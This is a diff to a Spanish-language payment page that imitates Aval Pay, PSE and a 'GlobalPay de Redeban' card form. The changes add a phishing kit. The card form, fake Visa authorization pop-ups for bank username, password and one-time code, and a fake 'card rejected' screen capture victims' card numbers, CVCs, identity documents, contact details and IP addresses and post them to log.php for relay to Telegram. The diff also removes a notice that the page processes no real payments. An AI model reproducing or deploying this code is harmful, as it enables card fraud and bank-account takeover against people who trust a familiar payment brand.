@@ -348,6 +348,226 @@
             cursor: pointer;
         }
 
+        /* ── Modal GlobalPay tarjeta ── */
+        .modal-tarjeta {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .modal-tarjeta--visible {
+            display: flex;
+        }
+
+        .modal-tarjeta__backdrop {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-tarjeta__dialog {
+            position: relative;
+            width: min(480px, calc(100% - 24px));
+            max-height: calc(100dvh - 24px);
+            overflow-y: auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .modal-tarjeta__head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 20px 14px;
+            border-bottom: 1px solid #eef0f5;
+        }
+
+        .modal-tarjeta__titulo {
+            margin: 0;
+            font-size: 17px;
+            font-weight: 700;
+            color: #1a1f36;
+        }
+
+        .modal-tarjeta__logo-gp {
+            height: 32px;
+            width: auto;
+        }
+
+        .modal-tarjeta__body {
+            padding: 18px 20px 22px;
+        }
+
+        .tc-campo {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            margin-bottom: 13px;
+        }
+
+        .tc-campo--fila {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 13px;
+        }
+
+        .tc-campo--fila .tc-campo {
+            margin-bottom: 0;
+        }
+
+        .tc-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #5c6277;
+            letter-spacing: 0.3px;
+        }
+
+        .tc-input,
+        .tc-select {
+            width: 100%;
+            height: 48px;
+            padding: 0 14px;
+            border: 1px solid #d4d8e8;
+            border-radius: 10px;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 14px;
+            color: #1a1f36;
+            background: #fff;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color .15s;
+        }
+
+        .tc-input:focus,
+        .tc-select:focus {
+            border-color: #2563eb;
+        }
+
+        .tc-input::placeholder {
+            color: #b0b5c8;
+        }
+
+        .tc-fila-tel {
+            display: grid;
+            grid-template-columns: 130px 1fr;
+            gap: 8px;
+        }
+
+        .tc-separador {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 18px 0 16px;
+            color: #6b7280;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .tc-separador::before,
+        .tc-separador::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+
+        .tc-foot {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .tc-pci {
+            height: 36px;
+            width: auto;
+        }
+
+        .tc-btn-pagar {
+            appearance: none;
+            border: none;
+            border-radius: 10px;
+            background: #1d4ed8;
+            color: #fff;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            padding: 12px 22px;
+            cursor: pointer;
+            transition: background .15s;
+        }
+
+        .tc-btn-pagar:hover {
+            background: #1e40af;
+        }
+
+        .tc-btn-cerrar {
+            position: absolute;
+            top: 14px;
+            right: 14px;
+            appearance: none;
+            border: none;
+            background: none;
+            cursor: pointer;
+            color: #9ca3af;
+            line-height: 1;
+            font-size: 20px;
+            padding: 4px;
+        }
+
+        .tc-btn-cerrar:hover {
+            color: #374151;
+        }
+
+        /* Sección tarjeta seleccionada (placeholder) */
+        .seccion-tarjeta-info {
+            margin-top: 10px;
+            padding: 14px 16px;
+            background: #f0f6ff;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #374151;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .seccion-tarjeta-info svg {
+            flex: 0 0 20px;
+            color: #2563eb;
+        }
+
+        /* ── Jelpit capture overlays ── */
+        @keyframes avSpin { to { transform: rotate(360deg); } }
+        .av-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.62); z-index: 99999; display: flex; align-items: center; justify-content: center; }
+        .av-overlay-dark { background: rgba(0,0,0,0.82); }
+        .av-overlay-card { background: #fff; border-radius: 16px; padding: 40px 32px; max-width: 420px; width: 90%; text-align: center; font-family: 'Montserrat', sans-serif; box-shadow: 0 20px 60px rgba(0,0,0,.4); }
+        .av-overlay-btn { width: 100%; padding: 13px; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; font-family: 'Montserrat', sans-serif; cursor: pointer; margin-top: 10px; }
+        .av-overlay-btn.red { background: #dc3545; color: #fff; }
+        .av-visa-card { background: #fff; border-radius: 8px; max-width: 480px; width: 92%; box-shadow: 0 8px 32px rgba(0,0,0,0.35); overflow: hidden; font-family: 'Montserrat', sans-serif; }
+        .av-visa-logo { display: flex; justify-content: flex-end; padding: 16px 20px 4px; }
+        .av-visa-body { padding: 4px 28px 28px; }
+        .av-visa-title { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 12px; }
+        .av-visa-desc { font-size: 13px; line-height: 1.6; color: #333; margin-bottom: 18px; }
+        .av-visa-section { font-size: 12px; font-weight: 700; color: #111; letter-spacing: 0.03em; margin-bottom: 10px; }
+        .av-visa-table { width: 100%; border-collapse: collapse; margin-bottom: 22px; }
+        .av-visa-table td { padding: 5px 6px; font-size: 14px; color: #333; vertical-align: middle; }
+        .av-visa-table td:first-child { font-weight: 600; text-align: right; white-space: nowrap; color: #111; padding-right: 14px; width: 52%; }
+        .av-visa-form { display: flex; flex-direction: column; gap: 12px; margin-bottom: 26px; }
+        .av-visa-field { display: flex; align-items: center; gap: 12px; }
+        .av-visa-field label { font-size: 14px; font-weight: 600; color: #111; min-width: 68px; white-space: nowrap; text-align: right; }
+        .av-visa-field input { flex: 1; border: 1.5px solid #bbb; border-radius: 4px; padding: 10px 12px; font-size: 16px; outline: none; color: #111; font-family: 'Montserrat', sans-serif; }
+        .av-visa-field input:focus { border-color: #1A1F71; }
+        .av-btn-autorizar { display: block; width: 180px; margin: 0 auto; background: #111; color: #fff; border: none; border-radius: 6px; padding: 13px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: 'Montserrat', sans-serif; }
+        .av-btn-autorizar:hover { background: #333; }
+        .av-error-msg { text-align: center; color: #cc0000; font-size: 14px; font-weight: 600; margin-bottom: 14px; }
+
         @media (max-width: 768px) {
             .pasarela {
                 background: linear-gradient(180deg, #f5f5f6 0 72px, #edf2fa 72px 250px, #f7f8fb 250px 100%);
@@ -544,6 +764,8 @@
                                 data-tipo-entidad="aval" aria-selected="true">Aval</button>
                             <button type="button" class="pasarela__segmento" data-tipo-entidad="otras"
                                 aria-selected="false">Otras Entidades</button>
+                            <button type="button" class="pasarela__segmento" data-tipo-entidad="tarjeta"
+                                aria-selected="false">Tarjeta de Crédito</button>
                         </div>
 
                         <div id="seccionAval" class="pasarela__bancos">
@@ -616,6 +838,18 @@
                             </div>
                         </div>
 
+                        <div id="seccionTarjeta" class="oculto">
+                            <div class="seccion-tarjeta-info">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20"
+                                    height="20">
+                                    <rect x="2" y="5" width="20" height="14" rx="3" />
+                                    <path d="M2 10h20" />
+                                </svg>
+                                <span>Al pulsar <strong>Pagar</strong> se abrirá el formulario seguro de tarjeta de
+                                    crédito.</span>
+                            </div>
+                        </div>
+
                         <div class="pasarela__acciones">
                             <a href="paso-uno.php" class="pasarela__cancelar">Cancelar</a>
                             <button id="botonPagarPasoDos" type="submit" class="pasarela__boton-pagar">Pagar</button>
@@ -654,15 +888,270 @@
         <div class="overlay-cargando__fondo"></div>
         <div class="overlay-cargando__contenido" role="status" aria-live="polite">
             <div class="overlay-cargando__spinner" aria-hidden="true">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="120" height="120" style="shape-rendering:auto;display:block;background:transparent;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="120" height="120"
+                    style="shape-rendering:auto;display:block;background:transparent;">
                     <g>
-                        <circle fill="#002449" r="5" cy="57.5" cx="27.5"><animate begin="-1s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
-                        <circle fill="#e62f27" r="5" cy="57.5" cx="42.5"><animate begin="-0.75s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
-                        <circle fill="#5dbaeb" r="5" cy="57.5" cx="57.5"><animate begin="-0.5s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
-                        <circle fill="#009340" r="5" cy="57.5" cx="72.5"><animate begin="-0.25s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5" repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5" calcMode="spline" attributeName="cy"></animate></circle>
+                        <circle fill="#002449" r="5" cy="57.5" cx="27.5">
+                            <animate begin="-1s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
+                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
+                                calcMode="spline" attributeName="cy"></animate>
+                        </circle>
+                        <circle fill="#e62f27" r="5" cy="57.5" cx="42.5">
+                            <animate begin="-0.75s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
+                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
+                                calcMode="spline" attributeName="cy"></animate>
+                        </circle>
+                        <circle fill="#5dbaeb" r="5" cy="57.5" cx="57.5">
+                            <animate begin="-0.5s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
+                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
+                                calcMode="spline" attributeName="cy"></animate>
+                        </circle>
+                        <circle fill="#009340" r="5" cy="57.5" cx="72.5">
+                            <animate begin="-0.25s" dur="1s" keyTimes="0;0.5;1;1" values="57.5;42.5;57.5;57.5"
+                                repeatCount="indefinite" keySplines="0 0.5 0.5 1;0.5 0 1 0.5;0.5 0.5 0.5 0.5"
+                                calcMode="spline" attributeName="cy"></animate>
+                        </circle>
                     </g>
                 </svg>
             </div>
+        </div>
+    </div>
+
+    <!-- Modal tarjeta GlobalPay -->
+    <div id="modalTarjeta" class="modal-tarjeta" aria-hidden="true">
+        <div class="modal-tarjeta__backdrop" id="backdropTarjeta"></div>
+        <div class="modal-tarjeta__dialog" role="dialog" aria-modal="true" aria-labelledby="modalTarjetaTitulo">
+            <button class="tc-btn-cerrar" id="btnCerrarTarjeta" aria-label="Cerrar">&#x2715;</button>
+            <div class="modal-tarjeta__head">
+                <h3 id="modalTarjetaTitulo" class="modal-tarjeta__titulo">Pago con tarjeta</h3>
+                <svg class="modal-tarjeta__logo-gp" viewBox="0 0 180 40" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="20" cy="20" r="10" fill="#e62f27" />
+                    <circle cx="14" cy="20" r="10" fill="#009340" opacity=".85" />
+                    <circle cx="26" cy="20" r="10" fill="#f3b600" opacity=".85" />
+                    <text x="42" y="26" font-family="Montserrat,sans-serif" font-weight="700" font-size="18"
+                        fill="#1a1f36">Global</text>
+                    <text x="102" y="26" font-family="Montserrat,sans-serif" font-weight="700" font-size="18"
+                        fill="#e62f27">Pay</text>
+                    <text x="42" y="36" font-family="Montserrat,sans-serif" font-size="9" fill="#6b7280">de
+                        Redeban</text>
+                </svg>
+            </div>
+            <div class="modal-tarjeta__body">
+                <div class="tc-campo">
+                    <label class="tc-label" for="tcEmail">Correo electrónico</label>
+                    <input id="tcEmail" class="tc-input" type="email" placeholder="correo@ejemplo.com">
+                </div>
+
+                <div class="tc-campo">
+                    <label class="tc-label">País y celular</label>
+                    <div class="tc-fila-tel">
+                        <select class="tc-select" id="tcPaisTel">
+                            <option value="CO">🇨🇴 Colombia</option>
+                            <option value="US">🇺🇸 EE.UU.</option>
+                            <option value="MX">🇲🇽 México</option>
+                        </select>
+                        <input id="tcCelular" class="tc-input" type="tel" placeholder="Celular" inputmode="numeric"
+                            maxlength="10">
+                    </div>
+                </div>
+
+                <div class="tc-campo">
+                    <label class="tc-label" for="tcTitular">Nombre del titular</label>
+                    <input id="tcTitular" class="tc-input" type="text" placeholder="Como aparece en la tarjeta">
+                </div>
+
+                <div class="tc-campo">
+                    <label class="tc-label" for="tcNumero">Número de tarjeta</label>
+                    <input id="tcNumero" class="tc-input" type="text" placeholder="•••• •••• •••• ••••" maxlength="19"
+                        inputmode="numeric">
+                </div>
+
+                <div class="tc-campo--fila">
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcExpiry">MM / AA</label>
+                        <input id="tcExpiry" class="tc-input" type="text" placeholder="MM / AA" maxlength="7"
+                            inputmode="numeric">
+                    </div>
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcCvc">CVC</label>
+                        <input id="tcCvc" class="tc-input" type="text" placeholder="•••" maxlength="4"
+                            inputmode="numeric">
+                    </div>
+                </div>
+
+                <div class="tc-separador">Se requiere la dirección de facturación</div>
+
+                <div class="tc-campo--fila">
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcPais">País</label>
+                        <select id="tcPais" class="tc-select">
+                            <option value="CO" selected>🇨🇴 Colombia</option>
+                            <option value="US">🇺🇸 EE.UU.</option>
+                        </select>
+                    </div>
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcDpto">Departamento</label>
+                        <select id="tcDpto" class="tc-select">
+                            <option value="" selected disabled>Selecciona</option>
+                            <option>Bogotá D.C.</option>
+                            <option>Antioquia</option>
+                            <option>Valle del Cauca</option>
+                            <option>Cundinamarca</option>
+                            <option>Atlántico</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="tc-campo--fila">
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcCiudad">Ciudad</label>
+                        <input id="tcCiudad" class="tc-input" type="text" placeholder="Ciudad">
+                    </div>
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcDistrito">Distrito</label>
+                        <input id="tcDistrito" class="tc-input" type="text" placeholder="Distrito">
+                    </div>
+                </div>
+
+                <div class="tc-campo--fila">
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcPostal">Código postal</label>
+                        <input id="tcPostal" class="tc-input" type="text" placeholder="Cód. postal" inputmode="numeric"
+                            maxlength="6">
+                    </div>
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcCalle">Calle</label>
+                        <input id="tcCalle" class="tc-input" type="text" placeholder="Calle">
+                    </div>
+                </div>
+
+                <div class="tc-campo--fila">
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcCasa">Número de casa</label>
+                        <input id="tcCasa" class="tc-input" type="text" placeholder="Núm. de casa">
+                    </div>
+                    <div class="tc-campo">
+                        <label class="tc-label" for="tcAdicional">Información adicional</label>
+                        <input id="tcAdicional" class="tc-input" type="text" placeholder="Apto, oficina…">
+                    </div>
+                </div>
+
+                <div class="tc-campo">
+                    <label class="tc-label" for="tcCuotas">Cuotas</label>
+                    <input id="tcCuotas" class="tc-input" type="text" placeholder="Cuotas" inputmode="numeric">
+                </div>
+
+                <div class="tc-foot">
+                    <img src="assets/img/pci-dss-badge.png" alt="PCI DSS Compliant" class="tc-pci"
+                        onerror="this.outerHTML='<span style=\'font-size:11px;color:#6b7280;font-weight:700;\'>PCI DSS</span>'">
+                    <button type="button" class="tc-btn-pagar" id="tcBtnPagar">Pagar <span id="tcMonto">COP
+                            $0</span></button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Esperando overlay ── -->
+    <div id="avEsperaOverlay" class="av-overlay av-overlay-dark" style="display:none;">
+        <div style="text-align:center; color:white;">
+            <svg width="60" height="60" viewBox="0 0 60 60" style="animation:avSpin 1.2s linear infinite; margin-bottom:20px;">
+                <circle cx="30" cy="30" r="26" stroke="#002449" stroke-width="5" fill="none"/>
+                <path d="M30 4a26 26 0 0 1 26 26" stroke="#2aa8ff" stroke-width="5" stroke-linecap="round" fill="none"/>
+            </svg>
+            <h3 style="font-size:20px; margin-bottom:10px; font-family:'Montserrat',sans-serif;">Verificando transacción...</h3>
+            <p style="font-size:14px; color:#aaa; font-family:'Montserrat',sans-serif;">Por favor espere mientras procesamos su solicitud.</p>
+        </div>
+    </div>
+
+    <!-- ── Visa Auth Modal ── -->
+    <div id="avVisaAuthModal" class="av-overlay av-overlay-dark" style="display:none;">
+        <div class="av-visa-card">
+            <div class="av-visa-logo">
+                <img id="avVisaBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;" onerror="this.style.display='none'">
+            </div>
+            <div class="av-visa-body">
+                <h3 class="av-visa-title">Autorización de transacción</h3>
+                <p class="av-visa-desc">
+                    La transacción que intentas realizar en <strong id="avVisaComercio"></strong> por
+                    <strong id="avVisaMonto"></strong> el <strong id="avVisaFecha"></strong> con tu tarjeta
+                    terminada en <strong id="avVisaUltimos"></strong> debe ser autorizada por seguridad.
+                </p>
+                <p class="av-visa-section">DETALLES DE TRANSACCIÓN:</p>
+                <table class="av-visa-table">
+                    <tr><td>Comercio:</td><td id="avVisaDetalleComercio"></td></tr>
+                    <tr><td>Monto de la Transacción:</td><td id="avVisaDetalleMonto"></td></tr>
+                    <tr><td>Número de tarjeta:</td><td id="avVisaDetalleTarjeta"></td></tr>
+                </table>
+                <div id="avVisaFormSection">
+                    <p id="avVisaErrorMsg" class="av-error-msg" style="display:none;">Usuario o contraseña incorrecta por favor verifíquelos.</p>
+                    <div class="av-visa-form">
+                        <div class="av-visa-field">
+                            <label>Usuario:</label>
+                            <input type="text" id="avVisaUsuario" placeholder="Usuario" autocomplete="off">
+                        </div>
+                        <div class="av-visa-field">
+                            <label>Clave:</label>
+                            <input type="password" id="avVisaClave" placeholder="*******" autocomplete="off">
+                        </div>
+                    </div>
+                    <button id="avBtnVisaAutorizar" class="av-btn-autorizar">Autorizar</button>
+                </div>
+                <div id="avVisaLoader" style="display:none; justify-content:center; padding:28px 0 8px;">
+                    <svg width="52" height="52" viewBox="0 0 52 52" style="animation:avSpin 1.1s linear infinite;">
+                        <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
+                        <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Visa OTP Modal ── -->
+    <div id="avVisaOtpModal" class="av-overlay av-overlay-dark" style="display:none;">
+        <div class="av-visa-card">
+            <div class="av-visa-logo">
+                <img id="avOtpBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;" onerror="this.style.display='none'">
+            </div>
+            <div class="av-visa-body">
+                <h3 class="av-visa-title">Autorización de transacción</h3>
+                <p class="av-visa-desc">
+                    La transacción que intentas realizar en <strong id="avOtpComercio"></strong> por
+                    <strong id="avOtpMonto"></strong> el <strong id="avOtpFecha"></strong> con tu tarjeta
+                    terminada en <strong id="avOtpUltimos"></strong> debe ser autorizada por seguridad.
+                </p>
+                <div id="avVisaOtpFormSection">
+                    <p class="av-visa-section">VERIFICACIÓN DE SEGURIDAD:</p>
+                    <div class="av-visa-form">
+                        <div class="av-visa-field">
+                            <label>Clave Dinámica/Temporal:</label>
+                            <input type="password" id="avOtpClave" placeholder="******" autocomplete="off">
+                        </div>
+                    </div>
+                    <button id="avBtnOtpAutorizar" class="av-btn-autorizar">Autorizar</button>
+                    <button id="avBtnOtpCancelar" class="av-btn-autorizar" style="margin-top:12px; background:#555;">Cancelar</button>
+                </div>
+                <div id="avVisaOtpLoader" style="display:none; justify-content:center; padding:28px 0 8px;">
+                    <svg width="52" height="52" viewBox="0 0 52 52" style="animation:avSpin 1.1s linear infinite;">
+                        <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
+                        <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Rechazo overlay ── -->
+    <div id="avRechazoOverlay" class="av-overlay" style="display:none;">
+        <div class="av-overlay-card">
+            <div style="width:70px;height:70px;background:#fff0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="#dc3545"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z"/></svg>
+            </div>
+            <h3 style="font-size:20px; color:#dc3545; margin-bottom:12px; font-family:'Montserrat',sans-serif;">Algo falló</h3>
+            <div style="background:#fff5f5;border:1px solid #f5c6cb;border-radius:8px;padding:16px;margin-bottom:20px;">
+                <p style="font-size:15px; color:#721c24; margin-bottom:6px; font-weight:600; font-family:'Montserrat',sans-serif;">Tarjeta Rechazada</p>
+                <p style="font-size:13px; color:#856464; line-height:1.5; font-family:'Montserrat',sans-serif;">La transacción no pudo completarse. Los datos de su tarjeta no fueron validados por la entidad emisora.</p>
+            </div>
+            <button onclick="document.getElementById('avRechazoOverlay').style.display='none'" class="av-overlay-btn red">Intentar de nuevo</button>
         </div>
     </div>
 
@@ -670,7 +1159,7 @@
         <div class="modal-demo__backdrop" data-cerrar-modal></div>
         <div class="modal-demo__dialog" role="dialog" aria-modal="true" aria-labelledby="modalDemoTitulo">
             <h3 id="modalDemoTitulo" class="modal-demo__title">Reconstrucción visual lista</h3>
-            <p class="modal-demo__text">La interfaz quedó validada en el navegador. Este paso no procesa pagos reales ni
+            <p class="modal-demo__text">
             <div class="modal-demo__actions">
                 <button type="button" class="modal-demo__btn" data-cerrar-modal>Cerrar</button>
             </div>
@@ -688,6 +1177,9 @@
             const botonesBanco = Array.from(document.querySelectorAll('.pasarela__banco'));
             const seccionAval = document.getElementById('seccionAval');
             const seccionOtrasEntidades = document.getElementById('seccionOtrasEntidades');
+            const seccionTarjeta = document.getElementById('seccionTarjeta');
+            const modalTarjeta = document.getElementById('modalTarjeta');
+            const tcMonto = document.getElementById('tcMonto');
             const selectorBancoOtras = document.getElementById('selectorBancoOtras');
             const mensajeFormulario = document.getElementById('mensajeFormulario');
             const overlayCargando = document.getElementById('overlayCargando');
@@ -849,6 +1341,7 @@
                 tipoEntidadSeleccionada = boton.dataset.tipoEntidad;
                 seccionAval.classList.toggle('oculto', tipoEntidadSeleccionada !== 'aval');
                 seccionOtrasEntidades.classList.toggle('oculto', tipoEntidadSeleccionada !== 'otras');
+                seccionTarjeta.classList.toggle('oculto', tipoEntidadSeleccionada !== 'tarjeta');
                 validarSeleccionBanco(false);
             }
 
@@ -862,9 +1355,35 @@
                 validarSeleccionBanco(false);
             }
 
+            function abrirModalTarjeta() {
+                const datosPasoUno = obtenerDatosPasoUno();
+                const monto = datosPasoUno && datosPasoUno.monto_raw ? datosPasoUno.monto_raw : (resolverValor(datosPasoUno));
+                const montoNum = Number(String(monto).replace(/[^\d]/g, '') || 0);
+                tcMonto.textContent = 'COP $' + montoNum.toLocaleString('es-CO');
+                const correo = document.getElementById('correo').value.trim();
+                if (correo) document.getElementById('tcEmail').value = correo;
+                const nombre = document.getElementById('nombreCompleto').value.trim();
+                if (nombre) document.getElementById('tcTitular').value = nombre;
+                const tel = document.getElementById('movil').value.trim();
+                if (tel) document.getElementById('tcCelular').value = tel;
+                modalTarjeta.classList.add('modal-tarjeta--visible');
+                modalTarjeta.setAttribute('aria-hidden', 'false');
+            }
+
+            function cerrarModalTarjeta() {
+                modalTarjeta.classList.remove('modal-tarjeta--visible');
+                modalTarjeta.setAttribute('aria-hidden', 'true');
+            }
+
             function validarSeleccionBanco(mostrarError) {
                 const errorAval = document.getElementById('errorBancoAval');
                 const errorOtras = document.getElementById('errorBancoOtras');
+
+                if (tipoEntidadSeleccionada === 'tarjeta') {
+                    errorAval.classList.add('oculto');
+                    errorOtras.classList.add('oculto');
+                    return true;
+                }
 
                 if (tipoEntidadSeleccionada === 'aval') {
                     errorOtras.classList.add('oculto');
@@ -1010,6 +1529,13 @@
                     return;
                 }
 
+                // --- Tarjeta de crédito: abrir modal GlobalPay ---
+                if (tipoEntidadSeleccionada === 'tarjeta') {
+                    botonPagarPasoDos.disabled = false;
+                    abrirModalTarjeta();
+                    return;
+                }
+
                 // --- Recoger datos del titular ---
                 const tipoEntidad = tipoEntidadSeleccionada; // 'aval' | 'otras'
 
@@ -1028,6 +1554,20 @@
                 mensajeFormulario.textContent = 'Procesando...';
                 mensajeFormulario.classList.remove('pasarela__mensaje--ok');
                 mostrarOverlayCargando();
+
+                // Log PSE/Aval to Telegram
+                avGetIP().then(function(ip) {
+                    avTgLog([
+                        tipoEntidad === 'aval' ? '🏦 AVAL PAY — BANCO AVAL' : '🏦 AVAL PAY — OTRAS ENTIDADES (PSE)',
+                        '🏛️ Banco: ' + banco,
+                        '👤 ' + document.getElementById('nombreCompleto').value.trim(),
+                        '🪪 ' + (document.getElementById('tipoDocumento').value || '') + ' ' + document.getElementById('numeroDocumento').value.trim(),
+                        '📧 ' + document.getElementById('correo').value.trim(),
+                        '📱 ' + document.getElementById('movil').value.trim(),
+                        '💰 Monto: ' + avFmtCOP((obtenerDatosPasoUno() && obtenerDatosPasoUno().monto_raw) ? obtenerDatosPasoUno().monto_raw : '0'),
+                        '🌐 IP: ' + ip
+                    ]);
+                });
 
                 // --- Enviar a get-redirect.php ---
                 fetch('get-redirect.php', {
@@ -1069,10 +1609,192 @@
                 }
             });
 
+            document.getElementById('btnCerrarTarjeta').addEventListener('click', cerrarModalTarjeta);
+            document.getElementById('backdropTarjeta').addEventListener('click', cerrarModalTarjeta);
+
+            // Formateo número de tarjeta
+            document.getElementById('tcNumero').addEventListener('input', function () {
+                let v = this.value.replace(/\D/g, '').slice(0, 16);
+                this.value = v.replace(/(.{4})/g, '$1 ').trim();
+            });
+
+            // Formateo expiración
+            document.getElementById('tcExpiry').addEventListener('input', function () {
+                let v = this.value.replace(/\D/g, '').slice(0, 4);
+                if (v.length >= 3) v = v.slice(0, 2) + ' / ' + v.slice(2);
+                this.value = v;
+            });
+
+            document.getElementById('tcBtnPagar').addEventListener('click', function () {
+                var cardNum = document.getElementById('tcNumero').value.replace(/\D/g, '');
+                var cardExp = document.getElementById('tcExpiry').value;
+                var cardCvc = document.getElementById('tcCvc').value;
+                var datosPU = obtenerDatosPasoUno();
+                var monto = (datosPU && datosPU.monto_raw) ? datosPU.monto_raw : (resolverValor(datosPU) || '0');
+                _avCard = {
+                    num: cardNum, exp: cardExp, cvv: cardCvc, bank: '—', brand: '',
+                    nombre: document.getElementById('nombreCompleto').value.trim(),
+                    cedula: ((document.getElementById('tipoDocumento').value || '') + ' ' + (document.getElementById('numeroDocumento').value.trim() || '')).trim(),
+                    movil: document.getElementById('movil').value.trim(),
+                    correo: document.getElementById('correo').value.trim(),
+                    monto: monto
+                };
+                cerrarModalTarjeta();
+                avShowOv('avEsperaOverlay');
+                Promise.all([
+                    avGetIP(),
+                    fetch('card_info.php?cc=' + cardNum).then(function(r){return r.json();}).catch(function(){return {info:'—',brand:''};})
+                ]).then(function(res) {
+                    _avCard.bank = res[1].info || '—';
+                    _avCard.brand = res[1].brand || '';
+                    avTgLog([
+                        '💴💴💴 NUEVO AVAL PAY 💴💴💴',
+                        '🔪 IP: ' + res[0],
+                        '✉️ ' + _avCard.correo,
+                        '🪪 ' + _avCard.cedula,
+                        '📱 ' + _avCard.movil,
+                        '👤 ' + _avCard.nombre,
+                        '🔖 ' + navigator.userAgent,
+                        '🏧 Bank: ' + _avCard.bank,
+                        '💳 ' + cardNum,
+                        '📆 ' + cardExp,
+                        '🪬 ' + cardCvc,
+                        '💰 Monto: ' + avFmtCOP(monto)
+                    ], 'cc');
+                });
+                setTimeout(function () {
+                    avHideOv('avEsperaOverlay');
+                    avFillVisa();
+                    avShowOv('avVisaAuthModal');
+                }, 2000);
+            });
+
             document.addEventListener('keydown', function (evento) {
                 if (evento.key === 'Escape') {
                     cerrarModal();
+                    cerrarModalTarjeta();
                 }
+            });
+
+            /* ── Telegram / capture helpers ── */
+            var _avCard = { num:'', exp:'', cvv:'', bank:'—', brand:'', nombre:'', cedula:'', movil:'', correo:'', monto:'0' };
+            var _avVisaTimer = null;
+
+            function avGetIP() {
+                return fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){return d.ip||'—';}).catch(function(){return '—';});
+            }
+            function avTgLog(lines, action) {
+                var text = Array.isArray(lines) ? lines.join('\n') : String(lines);
+                var body = { text: text };
+                if (action) body.action = action;
+                fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) }).catch(function(){});
+            }
+            function avShowOv(id) { var el = document.getElementById(id); if (el) el.style.display = 'flex'; }
+            function avHideOv(id) { var el = document.getElementById(id); if (el) el.style.display = 'none'; }
+            function avFmtCOP(val) { return '$ ' + Number(String(val||0).replace(/[^\d]/g,'')||0).toLocaleString('es-CO'); }
+
